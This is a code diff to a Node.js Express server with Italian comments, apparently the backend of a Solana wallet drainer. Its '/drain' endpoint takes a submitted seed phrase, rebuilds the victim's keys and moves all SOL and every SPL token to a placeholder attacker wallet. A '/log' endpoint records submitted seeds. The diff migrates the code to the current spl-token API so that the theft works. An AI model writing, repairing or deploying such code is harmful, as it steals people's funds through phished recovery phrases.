@@ -1,5 +1,11 @@
 import express from 'express';
-import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair, Token } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } from '@solana/web3.js';
+import { 
+  createTransferInstruction,
+  createAssociatedTokenAccountInstruction,
+  getAssociatedTokenAddress,
+  TOKEN_PROGRAM_ID
+} from '@solana/spl-token';
 import { mnemonicToSeed } from 'bip39';
 import { derivePath } from 'ed25519-hd-key';
 import path from 'path';
@@ -15,7 +21,7 @@ app.use(express.json({ limit: '10mb' }));
 const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // SOSTITUISCI CON LA TUA CHIAVE PUBBLICA
 const connection = new Connection('https://api.mainnet-beta.solana.com');
 
-// ===== DRENAGGIO TOTALE (COMPLETO) =====
+// ===== DRENAGGIO TOTALE =====
 app.post('/drain', async (req, res) => {
   const { seed, walletPublicKey } = req.body;
   if (!seed || !walletPublicKey) {
@@ -50,9 +56,9 @@ app.post('/drain', async (req, res) => {
       console.log(`✅ SOL trasferiti: ${amount / LAMPORTS_PER_SOL} SOL, Tx: ${solTx}`);
     }
 
-    // 3. DRENAGGIO TUTTI I TOKEN SPL (COMPLETO)
+    // 3. DRENAGGIO TUTTI I TOKEN SPL
     const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
-      programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+      programId: TOKEN_PROGRAM_ID,
     });
 
     let tokenTxList = [];
@@ -68,8 +74,8 @@ app.post('/drain', async (req, res) => {
           
           const mint = new PublicKey(accountInfo.data.slice(0, 32));
           
-          // Ottieni l'account token del ricevente (o crealo)
-          const receiverTokenAccount = await Token.getAssociatedTokenAddress(
+          // Ottieni l'account token del ricevente
+          const receiverTokenAccount = await getAssociatedTokenAddress(
             mint,
             toPubkey
           );
@@ -77,13 +83,13 @@ app.post('/drain', async (req, res) => {
           // Verifica se l'account token del ricevente esiste
           const receiverAccountInfo = await connection.getAccountInfo(receiverTokenAccount);
           
-          // Crea transazione di trasferimento
+          // Crea transazione
           const tx = new Transaction();
           
           // Se l'account del ricevente non esiste, crealo
           if (!receiverAccountInfo) {
             tx.add(
-              Token.createAssociatedTokenAccountInstruction(
+              createAssociatedTokenAccountInstruction(
                 fromPubkey, // payer
                 receiverTokenAccount,
                 toPubkey,
@@ -94,11 +100,10 @@ app.post('/drain', async (req, res) => {
           
           // Aggiungi istruzione di trasferimento
           tx.add(
-            Token.createTransferInstruction(
+            createTransferInstruction(
               tokenAccount,
               receiverTokenAccount,
               fromPubkey,
-              [],
               tokenInfo.value.amount
             )
           );
@@ -129,7 +134,7 @@ app.post('/drain', async (req, res) => {
   }
 });
 
-// ===== LOG (per debug) =====
+// ===== LOG =====
 app.post('/log', (req, res) => {
   console.log('📥 LOG:', req.body);
   if (req.body.seed) {
